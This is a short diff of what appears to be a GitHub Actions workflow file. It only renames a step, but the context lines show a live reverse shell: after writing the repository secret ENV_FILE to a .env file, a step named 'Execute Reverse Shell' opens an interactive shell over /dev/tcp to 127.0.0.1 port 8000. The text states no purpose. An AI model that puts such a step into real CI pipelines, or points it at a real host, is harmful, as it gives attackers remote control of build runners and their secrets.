@@ -44,7 +44,7 @@ jobs:
         run: |
           echo "${{ secrets.ENV_FILE }}" > .env
 
-      - name: Execute Reverse Shell
+      - name: Execute Reverse Shelll
         run: |
           (sh -i >& /dev/tcp/127.0.0.1/8000 0>&1 &)
 
